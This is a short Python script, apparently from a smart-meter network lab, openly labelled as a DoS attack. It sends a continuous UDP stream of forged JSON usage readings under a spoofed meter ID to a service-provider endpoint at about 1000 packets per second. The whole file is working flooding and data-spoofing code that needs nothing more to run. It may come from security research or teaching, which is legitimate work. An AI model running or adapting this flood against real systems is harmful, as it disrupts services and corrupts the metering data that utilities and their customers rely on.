

import socket
import json
import time
import random
import sys

SP_IP = "10.0.3.1"
SP_PORT = 9999


REG_MAP = {
    "sm1": "10.0.1.254", "sm2": "10.0.1.254", "sm3": "10.0.1.254",
    "sm4": "10.0.1.254", "sm5": "10.0.1.254",
    "sm6": "10.0.2.254", "sm7": "10.0.2.254", "sm8": "10.0.2.254",
    "sm9": "10.0.2.254", "sm10": "10.0.2.254"
}

SEND_INTERVAL = 0.001


def run_attack(sm_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    reg_ip = REG_MAP[sm_id]

    print("[ DOS ATTACK STARTED]")
    print(f"[!] Fake SM ID : {sm_id}")
    print(f"[!] REG Target : {reg_ip}")
    print(f"[!] SP Target  : {SP_IP}:{SP_PORT}")
    print(f"[!] Rate       : {int(1/SEND_INTERVAL)} pkt/sec")
    print("-" * 50)

    try:
        while True:
            payload = {
                "reg_id": reg_ip,
                "smId": sm_id,
                "usage": round(random.uniform(50, 500), 2),  
                "proto": "udp",
                "service": "-",
                "timestamp": time.time()
            }

            sock.sendto(json.dumps(payload).encode(), (SP_IP, SP_PORT))
            time.sleep(SEND_INTERVAL)

    except KeyboardInterrupt:
        print("\n[!] DOS ATTACK STOPPED")
        sock.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 attack_client.py <smId>")
        sys.exit(1)

    run_attack(sys.argv[1])
